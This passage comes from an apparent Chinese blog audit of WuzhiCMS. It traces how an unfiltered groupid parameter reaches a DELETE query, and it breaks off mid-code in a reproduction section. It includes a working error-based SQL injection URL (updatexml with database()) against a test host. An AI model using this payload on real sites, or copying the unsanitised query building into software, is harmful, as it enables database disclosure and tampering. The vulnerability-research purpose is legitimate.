class="line">13</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #E06C75">$identifying</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">load_class</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&#39;identifying_code&#39;</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #E06C75">$code</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">random_string</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&#39;diy&#39;</span><span style="color: #ABB2BF">,</span><span style="color: #61AFEF"> </span><span style="color: #D19A66">4</span><span style="color: #ABB2BF">,</span><span style="color: #61AFEF"> </span><span style="color: #98C379">&#39;abcdefghkmnpruvwxyzABCDEFGHKMNPRUVWXYZ23456789&#39;</span><span style="color: #ABB2BF">);</span></span><span class="line"></span><span class="line"><span style="color: #C678DD">if</span><span style="color: #ABB2BF">(</span><span style="color: #56B6C2">defined</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&#39;TEST_CHECKCODE&#39;</span><span style="color: #ABB2BF">) </span><span style="color: #56B6C2">&amp;&amp;</span><span style="color: #ABB2BF"> TEST_CHECKCODE</span><span style="color: #56B6C2">==</span><span style="color: #D19A66">1</span><span style="color: #ABB2BF">) {</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #E06C75">$code</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&#39;AAAA&#39;</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #E06C75">$_SESSION</span><span style="color: #ABB2BF">[</span><span style="color: #98C379">&#39;code&#39;</span><span style="color: #ABB2BF">] </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">strtolower</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">$code</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #56B6C2">header</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;Location:&quot;</span><span style="color: #ABB2BF">.</span><span style="color: #ABB2BF">R</span><span style="color: #ABB2BF">.</span><span style="color: #98C379">&#39;images/checkcode.png&#39;</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">} </span><span style="color: #C678DD">else</span><span style="color: #ABB2BF"> {</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #E06C75">$_SESSION</span><span style="color: #ABB2BF">[</span><span style="color: #98C379">&#39;code&#39;</span><span style="color: #ABB2BF">] </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">strtolower</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">$code</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #E06C75">$w</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">isset</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">$GLOBALS</span><span style="color: #ABB2BF">[</span><span style="color: #98C379">&#39;w&#39;</span><span style="color: #ABB2BF">]) </span><span style="color: #C678DD">?</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">intval</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">$GLOBALS</span><span style="color: #ABB2BF">[</span><span style="color: #98C379">&#39;w&#39;</span><span style="color: #ABB2BF">]) </span><span style="color: #C678DD">:</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">120</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #E06C75">$h</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">isset</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">$GLOBALS</span><span style="color: #ABB2BF">[</span><span style="color: #98C379">&#39;h&#39;</span><span style="color: #ABB2BF">]) </span><span style="color: #C678DD">?</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">intval</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">$GLOBALS</span><span style="color: #ABB2BF">[</span><span style="color: #98C379">&#39;h&#39;</span><span style="color: #ABB2BF">]) </span><span style="color: #C678DD">:</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">27</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #E06C75">$identifying</span><span style="color: #ABB2BF">-&gt;</span><span style="color: #61AFEF">image_one</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">$code</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75">$w</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75">$h</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">}</span></span></code></pre></div></div></figure></li></ol><h2 id="审计4（sql）"><a href="#审计4（sql）" class="headerlink" title="审计4（sql）"></a>审计4（sql）</h2><p>登录界面有跳转，url输入编号发现报错（测试能否报错注入）</p><p>根据复现1(sql)所寻找的可控变量（$where）</p><ol><li><p>寻找由$where控制的变量</p><p>coreframe\app\core\libs\class\db.class.php</p><figure class="shiki php"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">final</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">public</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">function</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">delete</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">$table</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">$where</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&#39;&#39;</span><span style="color: #ABB2BF">) {</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #E06C75">$where</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">$this</span><span style="color: #ABB2BF">-&gt;</span><span style="color: #61AFEF">array2sql</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">$where</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #C678DD">return</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">$this</span><span style="color: #ABB2BF">-&gt;</span><span style="color: #E06C75">master_db</span><span style="color: #ABB2BF">-&gt;</span><span style="color: #61AFEF">delete</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">$table</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">$where</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">}</span></span></code></pre></div></div></figure></li><li><p>跟进这个delete()</p><p>&#x2F;coreframe&#x2F;app&#x2F;member&#x2F;admin&#x2F;group.php</p><figure class="shiki php"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">public</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">function</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">del</span><span style="color: #ABB2BF">() {</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #C678DD">if</span><span style="color: #ABB2BF">(</span><span style="color: #56B6C2">isset</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">$GLOBALS</span><span style="color: #ABB2BF">[</span><span style="color: #98C379">&#39;groupid&#39;</span><span style="color: #ABB2BF">]) </span><span style="color: #56B6C2">&amp;&amp;</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">$GLOBALS</span><span style="color: #ABB2BF">[</span><span style="color: #98C379">&#39;groupid&#39;</span><span style="color: #ABB2BF">]) {</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #C678DD">if</span><span style="color: #ABB2BF">(</span><span style="color: #56B6C2">is_array</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">$GLOBALS</span><span style="color: #ABB2BF">[</span><span style="color: #98C379">&#39;groupid&#39;</span><span style="color: #ABB2BF">])) {</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #E06C75">$where</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&#39; IN (&#39;</span><span style="color: #ABB2BF">.</span><span style="color: #56B6C2">implode</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&#39;,&#39;</span><span style="color: #ABB2BF">,</span><span style="color: #61AFEF"> </span><span style="color: #E06C75">$GLOBALS</span><span style="color: #ABB2BF">[</span><span style="color: #98C379">&#39;groupid&#39;</span><span style="color: #ABB2BF">])</span><span style="color: #ABB2BF">.</span><span style="color: #98C379">&#39;)&#39;</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #C678DD">foreach</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">$GLOBALS</span><span style="color: #ABB2BF">[</span><span style="color: #98C379">&#39;groupid&#39;</span><span style="color: #ABB2BF">] </span><span style="color: #56B6C2">as</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">$gid</span><span style="color: #ABB2BF">) {</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #E5C07B">$this</span><span style="color: #ABB2BF">-&gt;</span><span style="color: #E06C75">db</span><span style="color: #ABB2BF">-&gt;</span><span style="color: #61AFEF">delete</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&#39;member_group_priv&#39;</span><span style="color: #ABB2BF">, </span><span style="color: #56B6C2">array</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&#39;groupid&#39;</span><span style="color: #ABB2BF"> =&gt; </span><span style="color: #E06C75">$gid</span><span style="color: #ABB2BF">));</span></span><span class="line"><span style="color: #ABB2BF">}</span></span><span class="line"><span style="color: #ABB2BF">} </span><span style="color: #C678DD">else</span><span style="color: #ABB2BF"> {</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #E06C75">$where</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&#39; = &#39;</span><span style="color: #ABB2BF">.</span><span style="color: #E06C75">$GLOBALS</span><span style="color: #ABB2BF">[</span><span style="color: #98C379">&#39;groupid&#39;</span><span style="color: #ABB2BF">];</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #E5C07B">$this</span><span style="color: #ABB2BF">-&gt;</span><span style="color: #E06C75">db</span><span style="color: #ABB2BF">-&gt;</span><span style="color: #61AFEF">delete</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&#39;member_group_priv&#39;</span><span style="color: #ABB2BF">, </span><span style="color: #56B6C2">array</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&#39;groupid&#39;</span><span style="color: #ABB2BF"> =&gt; </span><span style="color: #E06C75">$GLOBALS</span><span style="color: #ABB2BF">[</span><span style="color: #98C379">&#39;groupid&#39;</span><span style="color: #ABB2BF">]));</span></span><span class="line"><span style="color: #ABB2BF">}</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #E5C07B">$this</span><span style="color: #ABB2BF">-&gt;</span><span style="color: #E06C75">db</span><span style="color: #ABB2BF">-&gt;</span><span style="color: #61AFEF">delete</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&#39;member_group&#39;</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&#39;issystem != 1 AND groupid&#39;</span><span style="color: #ABB2BF">.</span><span style="color: #E06C75">$where</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #E5C07B">$this</span><span style="color: #ABB2BF">-&gt;</span><span style="color: #E06C75">group</span><span style="color: #ABB2BF">-&gt;</span><span style="color: #61AFEF">set_cache</span><span style="color: #ABB2BF">();</span></span><span class="line"></span><span class="line"></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #C678DD">if</span><span style="color: #ABB2BF">(</span><span style="color: #56B6C2">isset</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">$GLOBALS</span><span style="color: #ABB2BF">[</span><span style="color: #98C379">&#39;callback&#39;</span><span style="color: #ABB2BF">])){</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #56B6C2">echo</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">$GLOBALS</span><span style="color: #ABB2BF">[</span><span style="color: #98C379">&#39;callback&#39;</span><span style="color: #ABB2BF">]</span><span style="color: #ABB2BF">.</span><span style="color: #98C379">&#39;({&quot;status&quot;:1})&#39;</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #ABB2BF">}</span><span style="color: #C678DD">else</span><span style="color: #ABB2BF">{</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #61AFEF">MSG</span><span style="color: #ABB2BF">(</span><span style="color: #61AFEF">L</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&#39;operation_success&#39;</span><span style="color: #ABB2BF">));</span></span><span class="line"><span style="color: #ABB2BF">}</span></span><span class="line"><span style="color: #ABB2BF">}</span><span style="color: #C678DD">else</span><span style="color: #ABB2BF">{</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #C678DD">if</span><span style="color: #ABB2BF">(</span><span style="color: #56B6C2">isset</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">$GLOBALS</span><span style="color: #ABB2BF">[</span><span style="color: #98C379">&#39;callback&#39;</span><span style="color: #ABB2BF">])){</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #56B6C2">echo</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">$GLOBALS</span><span style="color: #ABB2BF">[</span><span style="color: #98C379">&#39;callback&#39;</span><span style="color: #ABB2BF">]</span><span style="color: #ABB2BF">.</span><span style="color: #98C379">&#39;({&quot;status&quot;:0})&#39;</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #ABB2BF">}</span><span style="color: #C678DD">else</span><span style="color: #ABB2BF">{</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #61AFEF">MSG</span><span style="color: #ABB2BF">(</span><span style="color: #61AFEF">L</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&#39;operation_failure&#39;</span><span style="color: #ABB2BF">));</span></span><span class="line"><span style="color: #ABB2BF">}</span></span><span class="line"><span style="color: #ABB2BF">}</span></span><span class="line"><span style="color: #ABB2BF">}</span></span></code></pre></div></div></figure></li><li><p>没有对$GLOBALS[‘groupid’]进行过滤处理，程序通过load_class()来加载核心类函数，实例化对象db并引用delete()方法：</p><figure class="shiki php"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">final</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">public</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">function</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">delete</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">$table</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">$where</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&#39;&#39;</span><span style="color: #ABB2BF">) {</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #E06C75">$where</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">$this</span><span style="color: #ABB2BF">-&gt;</span><span style="color: #61AFEF">array2sql</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">$where</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #C678DD">return</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">$this</span><span style="color: #ABB2BF">-&gt;</span><span style="color: #E06C75">master_db</span><span style="color: #ABB2BF">-&gt;</span><span style="color: #61AFEF">delete</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">$table</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">$where</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">}</span></span></code></pre></div></div></figure><p>array2sql($where)调用$where</p></li><li><p>写入测试代码</p><figure class="shiki shell"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #61AFEF">http://wuzhicms:90/index.php?m</span><span style="color: #ABB2BF">=member&amp;</span><span style="color: #E06C75">f</span><span style="color: #56B6C2">=</span><span style="color: #98C379">group</span><span style="color: #ABB2BF">&amp;</span><span style="color: #E06C75">v</span><span style="color: #56B6C2">=</span><span style="color: #98C379">del</span><span style="color: #ABB2BF">&amp;</span><span style="color: #E06C75">groupid</span><span style="color: #56B6C2">=</span><span style="color: #D19A66">1</span><span style="color: #98C379">%20and%20updatexml</span><span style="color: #ABB2BF">(</span><span style="color: #61AFEF">1,concat(0x7e,database(</span><span style="color: #ABB2BF">)</span><span style="color: #98C379">,0x7e</span><span style="color: #ABB2BF">)</span><span style="color: #98C379">,1</span><span style="color: #ABB2BF">)&amp;</span><span style="color: #E06C75">_su</span><span style="color: #56B6C2">=</span><span style="color: #98C379">wuzhicms</span><span style="color: #ABB2BF">&amp;</span><span style="color: #61AFEF">%20menuid</span><span style="color: #ABB2BF">=86&amp;</span><span style="color: #E06C75">callback</span><span style="color: #56B6C2">=</span><span style="color: #98C379">jQuery111105555776097227751_1667533450920</span><span style="color: #ABB2BF">&amp;=1667533450921</span></span></code></pre></div></div></figure><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027192527367.png" alt="image-20250719014224414" style="zoom: 20%;" /></li></ol><h1 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h1><h2 id="复现1-sql"><a href="#复现1-sql" class="headerlink" title="复现1(sql)"></a>复现1(sql)</h2><ol><li><p>寻找$sql相关的文件以及定义</p><p>coreframe\app\core\libs\class\mysql.class.php</p></li></ol><figure class="shiki php"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #E06C75">$query</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">$this</span><span style="color: #ABB2BF">-&gt;</span><span style="color: #61AFEF">query</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">$sql</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #C678DD">private</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">function</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">get_param_sql</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">$sql</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75">$param</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">array</span><span style="color: #ABB2BF">()) {</span></span><span class="line"><span style="color: #C678DD">public</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">function</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">get_page_list_count</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">$sql</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75">$param</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">array</span><span style="color: #ABB2BF">()) {</span></span><span class="line"><span style="color: #C678DD">public</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">function</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">get_page_list</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">$sql</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75">$param</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">array</span><span style="color: #ABB2BF">(), </span><span style="color: #E06C75">$page</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">$pagesize</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF"> ) {</span></span><span class="line"><span style="color: #ABB2BF">都是无用法的</span></span></code></pre></div></div></figure><figure class="shiki php"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">public</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">function</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">query</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">$sql</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">$type</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&#39;&#39;</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">$cachetime</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">FALSE</span><span style="color: #ABB2BF">) {</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #7F848E; font-style: italic">//if($_SERVER[&#39;REMOTE_ADDR&#39;]==&#39;127.0.0.1&#39;) echo $sql.&quot;&lt;br&gt;&quot;;</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #E06C75">$func</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">$type</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">==</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&#39;UNBUFFERED&#39;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">&amp;&amp;</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">@</span><span style="color: #56B6C2">function_exists</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&#39;mysql_unbuffered_query&#39;</span><span style="color: #ABB2BF">) </span><span style="color: #C678DD">?</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&#39;mysql_unbuffered_query&#39;</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">:</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&#39;mysql_query&#39;</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #C678DD">if</span><span style="color: #ABB2BF">(</span><span style="color: #56B6C2">!</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">$query</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">$func</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">$sql</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">$this</span><span style="color: #ABB2BF">-&gt;</span><span style="color: #E06C75">link</span><span style="color: #ABB2BF">)) </span><span style="color: #56B6C2">&amp;&amp;</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">$type</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">!=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&#39;SILENT&#39;</span><span style="color: #ABB2BF">) {</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #E5C07B">$this</span><span style="color: #ABB2BF">-&gt;</span><span style="color: #61AFEF">halt</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&#39;MySQL Query Error&#39;</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">$sql</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">}</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #E5C07B">$this</span><span style="color: #ABB2BF">-&gt;</span><span style="color: #E06C75">querynum</span><span style="color: #ABB2BF">++;</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #E5C07B">$this</span><span style="color: #ABB2BF">-&gt;</span><span style="color: #E06C75">histories</span><span style="color: #ABB2BF">[] </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">$sql</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #C678DD">return</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">$query</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #ABB2BF">}</span></span></code></pre></div></div></figure><ol start="2"><li>只能从query追踪到delete的定义(存在对query的调用)</li></ol><figure class="shiki php"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF"></span><span style="color: #C678DD">public</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">function</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">delete</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">$table</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">$where</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&#39;&#39;</span><span style="color: #ABB2BF">) {</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #E06C75">$where</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">$where</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">?</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&#39; WHERE &#39;</span><span style="color: #ABB2BF">.</span><span style="color: #E06C75">$where</span><span style="color: #C678DD">:</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&#39;&#39;</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #E06C75">$sql</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&#39;</span><span style="color: #C678DD">DELETE</span><span style="color: #98C379"> </span><span style="color: #C678DD">FROM</span><span style="color: #98C379"> `&#39;</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">$this</span><span style="color: #ABB2BF">-&gt;</span><span style="color: #E06C75">tablepre</span><span style="color: #ABB2BF">.</span><span style="color: #E06C75">$table</span><span style="color: #ABB2BF">.</span><span style="color: #98C379">&#39;`&#39;</span><span style="color: #ABB2BF">.</span><span style="color: #E06C75">$where</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #C678DD">return</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">$this</span><span style="color: #ABB2BF">-&gt;</span><span style="color: #61AFEF">query</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">$sql</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">}</span></span><span class="line"><span style="color: #7F848E; font-style: italic">#它把$sql参数当作sql语句执行了,可能存在sql</span></span></code></pre></div></div></figure><ol start="3"><li>追踪参数$where</li></ol><figure class="shiki php"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">public</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">function</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">listing</span><span style="color: #ABB2BF">() {</span></span><span class="line"><span style="color: #ABB2BF">       </span><span style="color: #E06C75">$siteid</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">get_cookie</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&#39;siteid&#39;</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">       </span><span style="color: #E06C75">$page</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: 